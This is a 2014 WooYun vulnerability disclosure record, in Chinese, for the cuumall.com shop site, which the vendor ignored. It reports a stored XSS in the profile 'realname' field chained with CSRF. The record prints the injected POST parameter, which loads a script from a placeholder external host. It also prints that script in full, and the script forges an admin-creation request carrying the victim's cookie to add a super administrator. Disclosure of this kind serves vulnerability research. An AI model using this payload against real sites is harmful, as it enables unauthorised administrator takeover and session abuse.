{"id": 54258, "wybug_id": "wooyun-2014-065039", "wybug_title": "CUUMALL商场存储型xss+csrf添加超级管理员", "wybug_corp": "cuumall.com", "wybug_author": "menmen519", "wybug_date": "2014-06-20 11:54", "wybug_open_date": "2014-06-25 11:55", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "利用技巧", "黑盒测试技巧", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： CUUMALL 存储型xss+csrf添加超级管理员 详细说明：  注册用户后，然后在完善用户资料后，然后进行重新编辑如图所示：\n\n这里我们抓一次包，然后重放post数据为：shen=%E6%B9%96%E5%8C%97&shi=%E8%8D%86%E5%B7%9E%E5%B8%82&qu=%E6%B2%99%E5%B8%82%E5%8C%BA&uid=529&realname=\"><script src=http://xxx/xss_csrf_shell.js></script><sp&email=atest%40qq.com&more=sdasdada&youbian=712000&tel=2294568226&mob=15802996564&qq=3154678&ww=22365&imageField.x=80&imageField.y=25&__hash__=542651f0fd15535c418aaa9ebdc11646如图所示:\n\nxss_csrf_shell.js内容如下：\nfunction ajax(){      var request = false;      if(window.XMLHttpRequest) {          request = new XMLHttpRequest();      } else if(window.ActiveXObject) {          var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];          for(var i=0; i<versions.length; i++) {              try {                  request = new ActiveXObject(versions[i]);              } catch(e) {}          }      }      return request;  }var _x = ajax();  postgo();function postgo() {      src=\"http://demo.cuumall.com/index.php/admin/adminmgr/addadminuser\";      data=\"username=test4&password=111111&password2=111111&admingroup=14&email=test4%40163.com&imageField.x=73&imageField.y=26&__hash__=0bdd686e67897ac78b07c171571da709\";\t    xhr_act(\"POST\",src,data);  }  function xhr_act(_m,_s,_a){    _x.open(_m,_s,false);\t\tcookie = document.cookie;    if(_m==\"POST\"){\t\t_x.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\t\t_x.setRequestHeader(\"Cookie\",cookie);\t}      _x.send(_a);      return _x.responseText;  }\n如上内容所示我们添加一个test4管理员，当管理员查看用户信息时候：\n\n然后我们到管理员权限，下面的管理员列表可以看到：\n\nok！！！！！！！！！！！！！   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-25 11:55 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-19 16:24 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  哥  我总是忍不住来膜拜你    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}